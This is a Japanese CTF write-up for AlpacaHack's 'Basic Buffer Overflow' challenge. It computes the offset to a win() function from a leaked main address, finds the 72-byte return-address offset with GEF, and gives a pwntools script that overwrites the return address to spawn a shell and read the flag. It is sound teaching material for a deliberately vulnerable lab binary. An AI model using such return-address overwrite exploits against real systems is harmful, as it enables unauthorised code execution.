# ■ Basic Buffer Overflow
[Basic Buffer Overflow - AlpacaHack](https://alpacahack.com/challenges/basic-buffer-overflow)

# 1. Writeup
## 1.0. `main.c`

`main.c`:
```c
...
22	void win() {
23	    execve("/bin/sh", NULL, NULL);
24	}
25	
26	int main(void) {
27	    printf("address of main function: %p\n", main);
28	    char buffer[64];
29	    printf("input > ");
30	    gets(buffer);
31	    return 0;
32	}
```

## 1.1. `win` アドレスのリーク
`win` の関数アドレスがわからないのでリークする必要がある.

```C
27	    printf("address of main function: %p\n", main);
```

で `main` のアドレスが提示されるので, これを基に `win` のアドレスを求めれば良い. そのためには `main` から `win` までのoffsetを計算する必要がある.

1. `nm` コマンドから計算
```bash
$ nm ./chal | grep '\smain'
0000000000001200 T main

$ nm ./chal | grep '\swin'
00000000000011dc T win
```

`0x1200 - 0x11dc = 0x24`.

2. GEFで簡単に確認
```bash
gef➤  p main - win
$1 = 0x24
```

なので, `main` アドレスから `0x24` 引いたアドレスが `win` アドレスだとわかる.

## 1.2. `buffer` からreturnまでのoffset

```bash
gef➤  pattern create 200
[+] Generating a pattern of 200 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
[+] Saved as '$_gef0'
```

これを `gets(buffer)` に渡して, `main` のリターンアドレスを書き換えてSIGSEGVを発生させる.  return時の `$rip` がどのバイト列に置き換えらるか(`$rsp`の先頭)を確認し, 該当バイト列までの距離がoffsetとなる.

GEFを用いて簡単に確認できる.

```bash
gef➤  x/4gx $rsp
0x7fffffffdd88: 0x616161616161616a      0x616161616161616b
0x7fffffffdd98: 0x616161616161616c      0x616161616161616d
gef➤  pattern search 0x616161616161616a
[+] Searching for '6a61616161616161'/'616161616161616a' with period=8
[+] Found at offset 72 (little-endian search) likely
```

`buf` から `main` のリターンアドレスまで72bytesだとわかる.

## 1.3. 方針, 回答

1. 提示される `main` アドレスから `win` アドレスをリークする(`<main-0x24>`).
2. `gets(buffer)` でBuffer Overflowを起こし, `main` のリターンアドレスを `win` アドレスに置き換える.
3. `win` がcallされシェルを得られるので `flag.txt` を確認する.

`solve.py`:
```python
from pwn import *

_, HOST, PORT = 'nc localhost 9999'.split()
io = remote(HOST, PORT)

# Get address: 0x????????????
def get_addr():
	recv = io.recvline()
	m = re.search(rb'0x[0-9a-f]{12}', recv)
	return m.group()

# Get main address
main_addr = int(get_addr(), 16)
log.info(f'main_addr: {hex(main_addr)}')

# Calculate win address
win_addr = main_addr - 0x24
log.info(f'win_addr: {hex(win_addr)}')

payload = b'A' * 72 # Padding to main return address
payload += p64(win_addr)
io.sendline(payload)

io.interactive()
```

実行例:
```bash
$ python ./solve.py
[+] Opening connection to localhost on port 9999: Done
[*] main_addr: 0x5623e1c78200
[*] win_addr: 0x5623e1c781dc
[*] Switching to interactive mode
input > $ id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
$ cat flag.txt
Alpaca{REDACTED}
```
